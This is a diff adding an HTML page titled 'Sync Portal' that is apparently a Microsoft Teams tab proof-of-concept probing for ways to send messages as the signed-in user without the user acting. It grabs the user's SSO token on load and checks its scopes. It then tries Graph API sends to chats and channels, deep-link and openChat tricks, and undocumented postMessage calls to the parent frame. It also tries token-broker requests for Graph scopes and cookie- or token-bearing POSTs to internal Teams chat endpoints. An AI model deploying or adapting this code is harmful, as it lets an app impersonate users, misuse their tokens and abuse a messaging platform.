@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sync Portal</title>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Segoe UI',sans-serif; background:#0d1117; color:#c9d1d9; padding:10px; font-size:12px; }
+  h2 { color:#58a6ff; font-size:14px; margin:10px 0 5px; border-bottom:1px solid #21262d; padding-bottom:3px; }
+  #out { background:#161b22; padding:10px; border-radius:6px; font-family:'Cascadia Code',monospace; font-size:11px; white-space:pre-wrap; word-break:break-all; max-height:80vh; overflow-y:auto; }
+  .ok { color:#3fb950; }
+  .fail { color:#f85149; }
+  .warn { color:#d29922; }
+  .info { color:#58a6ff; }
+  .crit { color:#f0883e; font-weight:bold; }
+  button { background:#21262d; color:#58a6ff; border:1px solid #30363d; padding:6px 12px; margin:3px; border-radius:4px; cursor:pointer; font-size:11px; }
+  button:hover { background:#30363d; }
+  .section { margin:8px 0; }
+  #controls { margin-bottom:10px; }
+</style>
+</head>
+<body>
+
+<div id="controls">
+  <button onclick="runAll()">Run All Tests</button>
+  <button onclick="runGraphSend()">Test Graph Send</button>
+  <button onclick="runChatPopulate()">Test Chat Populate + Send Tricks</button>
+  <button onclick="runPostMessageSend()">Test postMessage Send</button>
+  <button onclick="copyOutput()">Copy Output</button>
+</div>
+
+<div id="out"></div>
+
+<script>
+var el = document.getElementById('out');
+var SDK_READY = false;
+var CTX = null;
+var TOKEN = null;
+var TOKEN_CLAIMS = null;
+
+function log(msg, cls) {
+  var span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = msg + '\n';
+  el.appendChild(span);
+  el.scrollTop = el.scrollHeight;
+}
+
+function copyOutput() {
+  navigator.clipboard.writeText(el.textContent).catch(function(){});
+}
+
+// ================================================================
+// INIT
+// ================================================================
+async function init() {
+  log('=== INIT ===', 'info');
+  try {
+    await microsoftTeams.app.initialize();
+    SDK_READY = true;
+    log('SDK initialized', 'ok');
+  } catch(e) {
+    log('SDK init FAILED: ' + e.message, 'fail');
+    return;
+  }
+
+  try {
+    CTX = await microsoftTeams.app.getContext();
+    log('User: ' + CTX.user.userPrincipalName, 'ok');
+    log('Host: ' + CTX.app.host.clientType, 'ok');
+    log('Team: ' + (CTX.team && CTX.team.groupId || 'N/A'), 'info');
+    log('Channel: ' + (CTX.channel && CTX.channel.id || 'N/A'), 'info');
+    log('FrameContext: ' + (CTX.page && CTX.page.frameContext || 'N/A'), 'info');
+  } catch(e) {
+    log('Context FAILED: ' + e.message, 'fail');
+  }
+
+  try {
+    TOKEN = await microsoftTeams.authentication.getAuthToken();
+    TOKEN_CLAIMS = JSON.parse(atob(TOKEN.split('.')[1]));
+    log('Token OK | aud: ' + TOKEN_CLAIMS.aud, 'ok');
+    log('Token scopes: ' + (TOKEN_CLAIMS.scp || 'NONE'), 'info');
+    log('Token upn: ' + (TOKEN_CLAIMS.upn || 'N/A'), 'info');
+
+    if (TOKEN_CLAIMS.scp && TOKEN_CLAIMS.scp.indexOf('ChatMessage.Send') !== -1) {
+      log('*** ChatMessage.Send FOUND IN TOKEN ***', 'crit');
+    } else {
+      log('ChatMessage.Send NOT in token scopes', 'warn');
+    }
+  } catch(e) {
+    log('getAuthToken FAILED: ' + e.message, 'fail');
+    log('(sem token, Graph send nao vai funcionar)', 'warn');
+  }
+
+  log('');
+}
+
+// ================================================================
+// PART A: GRAPH API DIRECT SEND (bypasses UI entirely)
+// ================================================================
+async function runGraphSend() {
+  log('========================================', 'info');
+  log('PART A: GRAPH API DIRECT MESSAGE SEND', 'info');
+  log('========================================', 'info');
+
+  if (!TOKEN) {
+    log('Sem token, tentando obter...', 'warn');
+    try {
+      TOKEN = await microsoftTeams.authentication.getAuthToken();
+      TOKEN_CLAIMS = JSON.parse(atob(TOKEN.split('.')[1]));
+    } catch(e) {
+      log('Token FAILED: ' + e.message, 'fail');
+      return;
+    }
+  }
+
+  var graphHeaders = { 'Authorization': 'Bearer ' + TOKEN, 'Content-Type': 'application/json' };
+
+  // A1: Test if token works on Graph at all
+  log('\n--- A1: Graph /me ---', 'info');
+  try {
+    var r = await fetch('https://graph.microsoft.com/v1.0/me', { headers: graphHeaders });
+    var me = await r.json();
+    if (r.ok) {
+      log('Graph /me: ' + me.displayName + ' (' + me.userPrincipalName + ')', 'ok');
+    } else {
+      log('Graph /me: ' + r.status + ' ' + (me.error && me.error.message || ''), 'fail');
+      log('Token audience nao e Graph. Tentando outros metodos...', 'warn');
+    }
+  } catch(e) {
+    log('Graph /me fetch error: ' + e.message, 'fail');
+  }
+
+  // A2: List my chats to get chatId
+  log('\n--- A2: List chats ---', 'info');
+  var chatId = null;
+  try {
+    var r = await fetch('https://graph.microsoft.com/v1.0/me/chats?$top=5', { headers: graphHeaders });
+    var data = await r.json();
+    if (r.ok && data.value) {
+      data.value.forEach(function(c) {
+        log('  Chat: ' + c.id + ' | type=' + c.chatType + ' | topic=' + (c.topic || '-'), 'ok');
+        if (!chatId) chatId = c.id;
+      });
+    } else {
+      log('  List chats: ' + r.status + ' ' + (data.error && data.error.message || ''), 'fail');
+    }
+  } catch(e) {
+    log('  List chats error: ' + e.message, 'fail');
+  }
+
+  // A3: Create a new 1:1 chat (to get a chatId if listing failed)
+  if (!chatId) {
+    log('\n--- A3: Create chat ---', 'info');
+    try {
+      var r = await fetch('https://graph.microsoft.com/v1.0/chats', {
+        method: 'POST',
+        headers: graphHeaders,
+        body: JSON.stringify({
+          chatType: 'oneOnOne',
+          members: [
+            { '@odata.type': '#microsoft.graph.aadUserConversationMember', roles: ['owner'], 'user@odata.bind': "https://graph.microsoft.com/v1.0/users('" + CTX.user.id + "')" },
+            { '@odata.type': '#microsoft.graph.aadUserConversationMember', roles: ['owner'], 'user@odata.bind': "https://graph.microsoft.com/v1.0/users('" + CTX.user.userPrincipalName + "')" }
+          ]
+        })
+      });
+      var data = await r.json();
+      if (r.ok || r.status === 201) {
+        chatId = data.id;
+        log('  Chat created: ' + chatId, 'ok');
+      } else {
+        log('  Create chat: ' + r.status + ' ' + (data.error && data.error.message || ''), 'fail');
+      }
+    } catch(e) {
+      log('  Create chat error: ' + e.message, 'fail');
+    }
+  }
+
+  // A4: Send message to chat via Graph
+  if (chatId) {
+    log('\n--- A4: SEND MESSAGE via Graph (chat) ---', 'crit');
+    try {
+      var r = await fetch('https://graph.microsoft.com/v1.0/chats/' + chatId + '/messages', {
+        method: 'POST',
+        headers: graphHeaders,
+        body: JSON.stringify({
+          body: { contentType: 'text', content: 'Security test - auto send from tab PoC' }
+        })
+      });
+      var data = await r.json();
+      if (r.ok || r.status === 201) {
+        log('*** MESSAGE SENT VIA GRAPH! ***', 'crit');
+        log('  msgId: ' + data.id, 'ok');
+        log('  from: ' + (data.from && data.from.user && data.from.user.displayName || '?'), 'ok');
+      } else {
+        log('  Send msg: ' + r.status + ' ' + (data.error && data.error.message || ''), 'fail');
+      }
+    } catch(e) {
+      log('  Send msg error: ' + e.message, 'fail');
+    }
+  }
+
+  // A5: Send message to channel via Graph (if in a team)
+  if (CTX && CTX.team && CTX.team.groupId && CTX.channel && CTX.channel.id) {
+    log('\n--- A5: SEND MESSAGE via Graph (channel) ---', 'crit');
+    try {
+      var url = 'https://graph.microsoft.com/v1.0/teams/' + CTX.team.groupId +
+                '/channels/' + encodeURIComponent(CTX.channel.id) + '/messages';
+      var r = await fetch(url, {
+        method: 'POST',
+        headers: graphHeaders,
+        body: JSON.stringify({
+          body: { contentType: 'text', content: 'Security test - auto send to channel from tab' }
+        })
+      });
+      var data = await r.json();
+      if (r.ok || r.status === 201) {
+        log('*** CHANNEL MESSAGE SENT VIA GRAPH! ***', 'crit');
+        log('  msgId: ' + data.id, 'ok');
+      } else {
+        log('  Channel send: ' + r.status + ' ' + (data.error && data.error.message || ''), 'fail');
+      }
+    } catch(e) {
+      log('  Channel send error: ' + e.message, 'fail');
+    }
+
+    // A5b: Try beta endpoint too
+    log('\n--- A5b: SEND via Graph BETA (channel) ---', 'info');
+    try {
+      var url = 'https://graph.microsoft.com/beta/teams/' + CTX.team.groupId +
+                '/channels/' + encodeURIComponent(CTX.channel.id) + '/messages';
+      var r = await fetch(url, {
+        method: 'POST',
+        headers: graphHeaders,
+        body: JSON.stringify({
+          body: { contentType: 'text', content: 'Security test - beta endpoint send' }
+        })
+      });
+      var data = await r.json();
+      if (r.ok || r.status === 201) {
+        log('*** BETA CHANNEL MESSAGE SENT! ***', 'crit');
+      } else {
+        log('  Beta send: ' + r.status + ' ' + (data.error && data.error.message || ''), 'fail');
+      }
+    } catch(e) {
+      log('  Beta send error: ' + e.message, 'fail');
+    }
+  }
+
+  log('');
+}
+
+// ================================================================
+// PART B: CHAT POPULATE + AUTO-SEND TECHNIQUES
+// ================================================================
+async function runChatPopulate() {
+  log('========================================', 'info');
+  log('PART B: CHAT POPULATE + SEND TECHNIQUES', 'info');
+  log('========================================', 'info');
+
+  if (!SDK_READY || !CTX) {
+    log('SDK not ready', 'fail');
+    return;
+  }
+
+  var targetUser = CTX.user.userPrincipalName;
+  var testMsg = 'PoC auto-send test ' + Date.now();
+
+  // B1: Standard openChat
+  log('\n--- B1: chat.openChat (baseline) ---', 'info');
+  try {
+    if (microsoftTeams.chat && microsoftTeams.chat.openChat) {
+      await microsoftTeams.chat.openChat({
+        user: targetUser,
+        message: testMsg + ' [B1-openChat]'
+      });
+      log('openChat: CALLED - message populated', 'ok');
+    } else {
+      log('chat.openChat not available', 'fail');
+    }
+  } catch(e) {
+    log('openChat: ' + e.message, 'fail');
+  }
+
+  await new Promise(r => setTimeout(r, 1500));
+
+  // B2: openChat + immediate second openChat (flush trick)
+  log('\n--- B2: double openChat (flush) ---', 'info');
+  try {
+    if (microsoftTeams.chat && microsoftTeams.chat.openChat) {
+      // First call populates message
+      microsoftTeams.chat.openChat({
+        user: targetUser,
+        message: testMsg + ' [B2-double]'
+      });
+      // Second call immediately - might flush the first
+      await new Promise(r => setTimeout(r, 200));
+      await microsoftTeams.chat.openChat({
+        user: targetUser,
+        message: ''
+      });
+      log('double openChat: CALLED', 'ok');
+    }
+  } catch(e) {
+    log('double openChat: ' + e.message, 'fail');
+  }
+
+  await new Promise(r => setTimeout(r, 1000));
+
+  // B3: openGroupChat (different API, might behave differently)
+  log('\n--- B3: chat.openGroupChat ---', 'info');
+  try {
+    if (microsoftTeams.chat && microsoftTeams.chat.openGroupChat) {
+      await microsoftTeams.chat.openGroupChat({
+        users: [targetUser],
+        topic: 'Security Test',
+        message: testMsg + ' [B3-groupChat]'
+      });
+      log('openGroupChat: CALLED', 'ok');
+    } else {
+      log('chat.openGroupChat not available', 'fail');
+    }
+  } catch(e) {
+    log('openGroupChat: ' + e.message, 'fail');
+  }
+
+  await new Promise(r => setTimeout(r, 1000));
+
+  // B4: Deep link with message parameter
+  log('\n--- B4: deep link chat ---', 'info');
+  try {
+    var deeplink = 'https://teams.microsoft.com/l/chat/0/0?users=' +
+      encodeURIComponent(targetUser) +
+      '&message=' + encodeURIComponent(testMsg + ' [B4-deeplink]');
+    await microsoftTeams.app.openLink(deeplink);
+    log('deep link openLink: CALLED', 'ok');
+  } catch(e) {
+    log('deep link: ' + e.message, 'fail');
+  }
+
+  await new Promise(r => setTimeout(r, 1000));
+
+  // B5: Deep link with topicName and message
+  log('\n--- B5: deep link with topic ---', 'info');
+  try {
+    var deeplink2 = 'https://teams.microsoft.com/l/chat/0/0?users=' +
+      encodeURIComponent(targetUser) +
+      '&topicName=SecurityAlert' +
+      '&message=' + encodeURIComponent(testMsg + ' [B5-topic]');
+    await microsoftTeams.app.openLink(deeplink2);
+    log('deep link with topic: CALLED', 'ok');
+  } catch(e) {
+    log('deep link topic: ' + e.message, 'fail');
+  }
+
+  await new Promise(r => setTimeout(r, 1000));
+
+  // B6: msteams:// protocol deep link
+  log('\n--- B6: msteams:// protocol ---', 'info');
+  try {
+    var msteamsLink = 'msteams://teams.microsoft.com/l/chat/0/0?users=' +
+      encodeURIComponent(targetUser) +
+      '&message=' + encodeURIComponent(testMsg + ' [B6-msteams]');
+    await microsoftTeams.app.openLink(msteamsLink);
+    log('msteams:// link: CALLED', 'ok');
+  } catch(e) {
+    log('msteams:// link: ' + e.message, 'fail');
+  }
+
+  await new Promise(r => setTimeout(r, 1000));
+
+  // B7: sharing.shareWebContent - shares content which sends a message
+  log('\n--- B7: sharing.shareWebContent ---', 'info');
+  try {
+    if (microsoftTeams.sharing && microsoftTeams.sharing.shareWebContent) {
+      await microsoftTeams.sharing.shareWebContent({
+        content: [{
+          type: 'URL',
+          url: 'https://example.com/security-test',
+          message: testMsg + ' [B7-share]',
+          preview: true
+        }]
+      });
+      log('shareWebContent: CALLED', 'ok');
+    } else {
+      log('sharing not available', 'fail');
+    }
+  } catch(e) {
+    log('shareWebContent: ' + e.message, 'fail');
+  }
+
+  await new Promise(r => setTimeout(r, 1000));
+
+  // B8: Try sending via meeting chat if in meeting context
+  log('\n--- B8: meeting chat ---', 'info');
+  try {
+    if (microsoftTeams.meeting) {
+      log('meeting module exists', 'info');
+      if (microsoftTeams.meeting.getMeetingDetails) {
+        microsoftTeams.meeting.getMeetingDetails(function(err, details) {
+          if (details) {
+            log('In a meeting! Details: ' + JSON.stringify(details).substring(0, 200), 'crit');
+          } else {
+            log('Not in a meeting or error: ' + (err || 'no details'), 'info');
+          }
+        });
+      }
+    }
+  } catch(e) {
+    log('meeting: ' + e.message, 'fail');
+  }
+
+  // B9: stageView - can show content to all meeting participants
+  log('\n--- B9: stageView.open ---', 'info');
+  try {
+    if (microsoftTeams.stageView && microsoftTeams.stageView.open) {
+      await microsoftTeams.stageView.open({
+        appId: CTX.app && CTX.app.host && CTX.app.host.appId || null,
+        contentUrl: 'https://example.com/security-test',
+        title: testMsg + ' [B9-stage]',
+        threadId: CTX.channel && CTX.channel.id || ''
+      });
+      log('stageView.open: CALLED', 'ok');
+    } else {
+      log('stageView not available', 'fail');
+    }
+  } catch(e) {
+    log('stageView: ' + e.message, 'fail');
+  }
+
+  log('');
+}
+
+// ================================================================
+// PART C: POSTMESSAGE TRICKS TO TRIGGER SEND
+// ================================================================
+async function runPostMessageSend() {
+  log('========================================', 'info');
+  log('PART C: POSTMESSAGE SEND TRICKS', 'info');
+  log('========================================', 'info');
+
+  var captured = [];
+  window.addEventListener('message', function handler(e) {
+    var data;
+    try { data = typeof e.data === 'object' ? JSON.stringify(e.data) : String(e.data); } catch(x) { data = String(e.data); }
+    if (data.length > 5 && data.indexOf('probe-echo') === -1) {
+      captured.push({ origin: e.origin, data: data.substring(0, 300) });
+      log('  << RECV [' + e.origin + ']: ' + data.substring(0, 200), 'warn');
+    }
+  });
+
+  var targetUser = CTX ? CTX.user.userPrincipalName : 'unknown';
+  var channelId = CTX && CTX.channel && CTX.channel.id || '';
+  var teamId = CTX && CTX.team && CTX.team.groupId || '';
+
+  // C1: SDK internal postMessage format - chat.sendMessage (undocumented)
+  log('\n--- C1: postMessage chat.sendMessage ---', 'info');
+  var sendProbes = [
+    // Try various internal func names that might trigger a send
+    { id: 1001, func: 'chat.sendMessage', args: [{ user: targetUser, message: 'PoC C1a' }] },
+    { id: 1002, func: 'chat.sendMessage', args: [targetUser, 'PoC C1b'] },
+    { id: 1003, func: 'sendMessage', args: [{ to: targetUser, body: 'PoC C1c' }] },
+    { id: 1004, func: 'sendChatMessage', args: [{ user: targetUser, message: 'PoC C1d' }] },
+    { id: 1005, func: 'chat.send', args: [{ user: targetUser, message: 'PoC C1e' }] },
+    { id: 1006, func: 'messages.send', args: [{ to: targetUser, content: 'PoC C1f' }] },
+    { id: 1007, func: 'sendMessageToChat', args: [{ participants: [targetUser], message: 'PoC C1g' }] },
+    { id: 1008, func: 'chat.postMessage', args: [{ user: targetUser, message: 'PoC C1h' }] },
+    { id: 1009, func: 'conversations.sendMessage', args: [{ to: targetUser, text: 'PoC C1i' }] },
+    { id: 1010, func: 'chat.compose', args: [{ user: targetUser, message: 'PoC C1j', send: true }] },
+  ];
+
+  for (var p of sendProbes) {
+    try {
+      window.parent.postMessage(p, '*');
+      log('  >> sent func=' + p.func, 'info');
+    } catch(e) {}
+  }
+
+  await new Promise(r => setTimeout(r, 2000));
+
+  // C2: Try openChat with various extra params that might trigger auto-send
+  log('\n--- C2: openChat variants via postMessage ---', 'info');
+  var openChatProbes = [
+    { id: 2001, func: 'chat.openChat', args: [{ user: targetUser, message: 'PoC C2a', send: true }] },
+    { id: 2002, func: 'chat.openChat', args: [{ user: targetUser, message: 'PoC C2b', autoSend: true }] },
+    { id: 2003, func: 'chat.openChat', args: [{ user: targetUser, message: 'PoC C2c', submit: true }] },
+    { id: 2004, func: 'chat.openChat', args: [{ user: targetUser, message: 'PoC C2d', sendImmediately: true }] },
+    { id: 2005, func: 'chat.openChat', args: [{ user: targetUser, message: 'PoC C2e', action: 'send' }] },
+    { id: 2006, func: 'chat.openChat', args: [{ users: [targetUser], message: 'PoC C2f', send: true }] },
+    { id: 2007, func: 'executeDeepLink', args: ['https://teams.microsoft.com/l/chat/0/0?users=' + encodeURIComponent(targetUser) + '&message=PoC+C2g&send=true'] },
+    { id: 2008, func: 'executeDeepLink', args: ['https://teams.microsoft.com/l/chat/0/0?users=' + encodeURIComponent(targetUser) + '&message=PoC+C2h&action=send'] },
+  ];
+
+  for (var p of openChatProbes) {
+    try {
+      window.parent.postMessage(p, '*');
+      log('  >> sent func=' + p.func + ' (with send flag)', 'info');
+    } catch(e) {}
+  }
+
+  await new Promise(r => setTimeout(r, 2000));
+
+  // C3: Channel message via postMessage
+  log('\n--- C3: channel message via postMessage ---', 'info');
+  if (channelId) {
+    var channelProbes = [
+      { id: 3001, func: 'channel.sendMessage', args: [{ channelId: channelId, message: 'PoC C3a' }] },
+      { id: 3002, func: 'channel.postMessage', args: [{ channelId: channelId, teamId: teamId, message: 'PoC C3b' }] },
+      { id: 3003, func: 'teams.sendMessage', args: [{ channelId: channelId, content: 'PoC C3c' }] },
+      { id: 3004, func: 'sendChannelMessage', args: [{ channelId: channelId, teamId: teamId, body: 'PoC C3d' }] },
+      { id: 3005, func: 'conversations.create', args: [{ channelId: channelId, message: { body: 'PoC C3e' } }] },
+    ];
+
+    for (var p of channelProbes) {
+      try {
+        window.parent.postMessage(p, '*');
+        log('  >> sent func=' + p.func, 'info');
+      } catch(e) {}
+    }
+  } else {
+    log('  No channel context, skipping', 'warn');
+  }
+
+  await new Promise(r => setTimeout(r, 2000));
+
+  // C4: Nested App Auth - try to get Graph token via parent broker
+  log('\n--- C4: NAA token request ---', 'info');
+  var naaProbes = [
+    {
+      messageType: 'NestedAppAuth.Request',
+      requestId: 'naa-' + Date.now(),
+      method: 'GetToken',
+      params: { resource: 'https://graph.microsoft.com', scopes: ['ChatMessage.Send', 'Chat.ReadWrite'] }
+    },
+    {
+      type: 'NestedAppAuth',
+      action: 'acquireTokenSilent',
+      scopes: ['https://graph.microsoft.com/ChatMessage.Send', 'https://graph.microsoft.com/Chat.ReadWrite']
+    },
+    {
+      messageType: 'NestedAppAuthRequest',
+      method: 'GetToken',
+      requestId: 'naa2-' + Date.now(),
+      params: { resource: 'https://graph.microsoft.com/.default' }
+    },
+    // MSAL broker format
+    {
+      type: 'BrokerHandshake',
+      clientId: '5e3ce6c0-2b1f-4285-8d4b-75ee78787346',
+      scope: 'https://graph.microsoft.com/ChatMessage.Send'
+    },
+    // Another MSAL internal format
+    {
+      channel: 'NestedAppAuth',
+      type: 'TokenRequest',
+      body: { clientId: '5e3ce6c0-2b1f-4285-8d4b-75ee78787346', scopes: 'https://graph.microsoft.com/.default' }
+    }
+  ];
+
+  for (var p of naaProbes) {
+    try {
+      window.parent.postMessage(p, '*');
+      window.parent.postMessage(JSON.stringify(p), '*');
+      log('  >> NAA probe: ' + (p.messageType || p.type || p.channel), 'info');
+    } catch(e) {}
+  }
+
+  await new Promise(r => setTimeout(r, 3000));
+
+  // C5: Try to use Teams internal APIs with credentials:include
+  log('\n--- C5: fetch Teams APIs with cookies ---', 'info');
+  var internalEndpoints = [
+    {
+      name: 'chatsvc-send',
+      method: 'POST',
+      url: 'https://chatsvcagg.teams.microsoft.com/v1/users/ME/conversations/' + (channelId || 'unknown') + '/messages',
+      body: JSON.stringify({ content: 'PoC C5 chatsvc', messagetype: 'RichText/Html', contenttype: 'text' })
+    },
+    {
+      name: 'teams-cloud-send',
+      method: 'POST',
+      url: 'https://teams.cloud.microsoft/api/mt/amer/beta/chats/' + (channelId || 'unknown') + '/messages',
+      body: JSON.stringify({ body: { content: 'PoC C5 teams-cloud' } })
+    },
+    {
+      name: 'teams-send-v1',
+      method: 'POST',
+      url: 'https://teams.microsoft.com/api/chatsvc/amer/v1/users/ME/conversations/' + (channelId || 'unknown') + '/messages',
+      body: JSON.stringify({ content: 'PoC C5 teams-v1', messagetype: 'Text', contenttype: 'text' })
+    }
+  ];
+
+  for (var ep of internalEndpoints) {
+    try {
+      var r = await fetch(ep.url, {
+        method: ep.method,
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: ep.body
+      });
+      var txt = await r.text();
+      log('  ' + ep.name + ': ' + r.status + ' ' + txt.substring(0, 100), r.ok ? 'crit' : 'fail');
+    } catch(e) {
+      log('  ' + ep.name + ': ' + e.message.substring(0, 60), 'fail');
+    }
+  }
+
+  // C6: Try fetch with the SSO token to internal APIs
+  if (TOKEN) {
+    log('\n--- C6: internal APIs with SSO token ---', 'info');
+    var tokenEndpoints = [
+      {
+        name: 'chatsvc-token',
+        method: 'POST',
+        url: 'https://chatsvcagg.teams.microsoft.com/v1/users/ME/conversations/' + (channelId || 'unknown') + '/messages',
+        body: JSON.stringify({ content: 'PoC C6', messagetype: 'Text', contenttype: 'text' })
+      },
+      {
+        name: 'chatsvc-send-v2',
+        method: 'POST',
+        url: 'https://chatsvcagg.teams.microsoft.com/v2/users/ME/conversations/' + (channelId || 'unknown') + '/messages',
+        body: JSON.stringify({ content: 'PoC C6v2', messagetype: 'Text' })
+      }
+    ];
+
+    for (var ep of tokenEndpoints) {
+      try {
+        var r = await fetch(ep.url, {
+          method: ep.method,
+          headers: { 'Authorization': 'Bearer ' + TOKEN, 'Content-Type': 'application/json' },
+          body: ep.body
+        });
+        var txt = await r.text();
+        log('  ' + ep.name + ': ' + r.status + ' ' + txt.substring(0, 100), r.ok ? 'crit' : 'fail');
+      } catch(e) {
+        log('  ' + ep.name + ': ' + e.message.substring(0, 60), 'fail');
+      }
+    }
+  }
+
+  // Summary
+  log('\n--- Captured responses: ' + captured.length + ' ---', 'info');
+  for (var i = 0; i < Math.min(captured.length, 20); i++) {
+    log('  [' + captured[i].origin + '] ' + captured[i].data, 'warn');
+  }
+
+  log('');
+}
+
+// ================================================================
+// RUN ALL
+// ================================================================
+async function runAll() {
+  el.textContent = '';
+  await init();
+  await runGraphSend();
+  await runChatPopulate();
+  await runPostMessageSend();
+  log('========================================', 'info');
+  log('ALL TESTS COMPLETE', 'info');
+  log('Copie o output acima e me envie.', 'info');
+}
+
+// Auto-init on load
+init();
+</script>
+</body>
+</html>
